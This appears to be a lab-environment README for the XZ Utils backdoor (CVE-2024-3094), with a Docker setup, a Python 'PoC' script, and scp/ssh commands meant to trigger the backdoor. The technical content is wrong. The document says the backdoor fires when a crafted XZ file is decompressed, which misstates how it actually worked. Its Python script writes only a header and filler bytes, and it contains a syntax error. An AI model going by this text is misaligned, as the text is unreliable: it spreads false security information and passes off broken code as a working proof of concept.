# XZ Utils Backdoor (CVE-2024-3094)

XZ Utils is a general-purpose data compression software with high compression ratio. In March 2024, a critical backdoor was discovered in XZ Utils versions 5.6.0 and 5.6.1. This backdoor allows remote attackers to execute arbitrary code by manipulating the compression process.

The backdoor was introduced through a supply chain attack, where malicious code was inserted into the XZ Utils source code. This vulnerability affects systems using the compromised versions of XZ Utils.

References:
- https://www.openwall.com/lists/oss-security/2024/03/29/4 (Initial disclosure)
- https://nvd.nist.gov/vuln/detail/CVE-2024-3094 (CVE details)

## Environment setup

The vulnerable environment exposes the following port

| Port | Service | Description |
|------|---------|-------------|
| 2222 | SSH     | Remote access allowed |

To start the vulnerable environment:

```bash
docker compose up -d
```

## Exploit

The backdoor is triggered when processing specially crafted XZ files. Here's a basic PoC

1. First, create a malicious XZ file (poc.xz)
```python
#!/usr/bin/env python3
import struct

# Create a specially crafted XZ file that triggers the backdoor
header = b'\xfd\x37\x7a\x58\x5a\x00\x00'  # XZ file header
payload = b'A' * 1000  # Replace with actual payload

with open('poc.xz', 'wb') as f
    f.write(header + payload)
```

2. Transfer the file to the target system
```bash
scp -P 2222 poc.xz root@localhost:/tmp/
```

3. Trigger the backdoor by decompressing the file
```bash
ssh -p 2222 root@localhost "xz -d /tmp/poc.xz"
```

The backdoor will be triggered during the decompression process. You can verify the XZ Utils version and check for signs of compromise

```bash
ssh -p 2222 root@localhost "xz --version && ls -la /tmp"
```

Note: This is a basic PoC. The actual backdoor is more sophisticated and requires specific conditions to be met.

## Note

This environment is for educational purposes only. Do not use in production environments. 